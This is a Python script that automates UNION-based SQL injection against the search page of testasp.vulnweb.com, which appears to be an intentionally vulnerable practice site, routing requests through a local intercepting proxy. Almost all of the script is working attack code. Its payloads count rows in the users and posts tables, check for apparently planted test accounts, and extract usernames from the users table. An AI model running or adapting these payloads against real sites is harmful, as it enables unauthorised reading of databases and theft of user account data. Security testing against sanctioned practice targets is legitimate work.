import subprocess, urllib.parse
BASE="http://testasp.vulnweb.com"
PROXY=["-x","http://127.0.0.1:8080","--cacert","/home/taeuk/.mitmproxy/mitmproxy-ca-cert.pem"]
def union(sel,tag):
    st="q')>0) UNION ALL SELECT "+sel+"--"
    u=f"{BASE}/Search.asp?tfSearch="+urllib.parse.quote(st,safe="")
    b="/tmp/cc.html"
    r=subprocess.run(["curl","-s","-S"]+PROXY+["-m","40","-o",b,"-w","%{http_code}",u],capture_output=True,text=True)
    body=open(b,"rb").read().decode("latin-1")
    i=body.find("posted by"); v=body[i+9:body.find("</b>",i)].strip() if i>=0 else "?"
    k="posttitle'>"; j=body.find(k); t=body[j+len(k):body.find("</div>",j)].strip() if j>=0 else "?"
    print(f"  {tag:22} poster={v!r} title={t!r}")
union("1,CAST((SELECT COUNT(*) FROM users) AS nvarchar(10)),CAST((SELECT COUNT(*) FROM posts) AS nvarchar(10)),1,1,1,1,'A','TT','FN'","counts(users,posts)")
union("1,CAST((SELECT COUNT(*) FROM users WHERE uname='acu-r9-reg') AS nvarchar(10)),CAST((SELECT COUNT(*) FROM users WHERE uname='acu-r7 proof') AS nvarchar(10)),1,1,1,1,'A','TT','FN'","our_accounts")
union("1,(SELECT STUFF((SELECT TOP 5 ','+uname FROM users FOR XML PATH('')),1,1,'')),1,1,1,1,'A','TT','FN'","sample_unames")
union("1,CAST((SELECT COUNT(*) FROM posts WHERE message LIKE '%ACU%') AS nvarchar(10)),1,1,1,1,1,'A','TT','FN'","posts_marker")
